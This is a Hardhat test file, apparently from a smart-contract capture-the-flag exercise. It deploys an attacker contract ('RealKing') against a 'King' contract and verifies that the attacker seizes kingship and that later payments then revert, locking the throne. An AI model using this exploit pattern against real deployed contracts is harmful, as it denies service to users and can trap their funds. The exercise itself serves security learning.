const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");

describe.only("King test", function() {
    beforeEach(async function() {
        [player] = await ethers.getSigners();
        hacker = await (await ethers.getContractFactory("RealKing")).deploy();
        king = await ethers.getContractAt("King", process.env.KING_ADDRESS);
        await hacker.deployed();
});
    describe("Hack test", function() {
        it("Should claim king failed without enough Ether", async function() {
            prize = await king.prize();
            expect(await king._king()).to.not.equal(hacker.address);
            await expectRevert(hacker.claimKing(king.address, {value: (await king.prize()).sub(1)}), "Ether not enough");
        });
        it("Should claim king successfully", async function() {
            prize = await king.prize();
            expect(await king._king()).to.not.equal(hacker.address);
            await hacker.claimKing(king.address, {value: prize});
            expect(await king._king()).to.equal(hacker.address);
            tx = {
                to: king.address,
                value: prize,
                gasLimit: 2_000_000
            };
            await expectRevert.unspecified(player.sendTransaction(tx));
        });
    });
});